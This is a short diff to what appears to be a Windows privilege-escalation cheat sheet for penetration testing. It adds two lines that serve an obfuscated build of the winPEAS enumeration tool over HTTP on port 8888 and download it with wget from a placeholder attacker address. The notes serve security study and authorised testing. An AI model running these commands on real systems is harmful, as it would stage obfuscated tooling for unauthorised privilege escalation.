@@ -74,6 +74,9 @@ Follow the general order below for least to most intensive
 Windows Path:
 set PATH=%PATH%;C:\xampp\php;C:\Python27\Lib;C:\Python27\DLLs;C:\Python27\Lib\lib-tk
 
+cd '/opt/privesc_scripts/winPEAS/winPEASexe/winPEAS/bin/Obfuscated Releases' && http 8888
+wget <INSERTIPADDRESS>:8888/winPEASany.exe
+  
 ## Kernel Vulnerablities
 Get specific OS/patch versions and list possible exploits here:
 systeminfo
